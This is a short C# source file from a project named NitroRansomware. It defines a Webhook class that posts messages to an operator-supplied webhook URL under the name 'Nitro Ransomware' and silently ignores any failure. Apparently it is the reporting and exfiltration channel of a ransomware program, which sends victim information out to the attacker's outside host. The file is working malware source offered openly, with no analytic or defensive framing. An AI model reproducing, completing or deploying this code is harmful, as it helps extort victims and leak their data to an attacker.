using System.Collections.Generic;
using System.Net.Http;
namespace NitroRansomware
{
    class Webhook
    {
        private string webhook;
        public Webhook(string userWebhook)
        {
            webhook = userWebhook;
        }
        public void Send(string content)
        {

            Dictionary<string, string> data = new Dictionary<string, string>
            {
                {"content", content },
                {"username", "Nitro Ransomware" },
                {"avatar_url", "https://i.ibb.co/0frTD92/discord-avatar-512.png"}
            };

            try
            {
                using (HttpClient client = new HttpClient())
                {
                    client.PostAsync(webhook, new FormUrlEncodedContent(data)).GetAwaiter().GetResult();
                }
            }

            catch
            {
            }
       
        }
    }
}
